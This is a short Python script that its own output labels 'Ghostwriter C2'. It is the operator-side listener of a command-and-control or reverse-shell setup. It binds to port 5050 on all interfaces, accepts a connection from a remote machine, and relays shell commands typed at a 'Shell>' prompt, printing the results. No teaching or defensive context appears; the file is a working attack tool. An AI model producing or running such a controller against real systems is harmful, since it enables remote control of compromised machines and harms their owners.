import socket

HOST = "0.0.0.0"
PORT = 5050

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.bind((HOST, PORT))
    except Exception as e:
        print(f"[!] Error binding to port: {e}")
        return

    s.listen(1)
    print(f"[*] Ghostwriter C2 listening on {HOST}:{PORT}...")

    conn, addr = s.accept()
    print(f"[+] Connected by {addr}")

    while True:
        command = input("Shell> ")
        
        if 'exit' in command:
            conn.send('exit'.encode())
            conn.close()
            break
        
        conn.send(command.encode())
        
        result = conn.recv(1024).decode()
        print(result)

if __name__ == "__main__":
    start_server()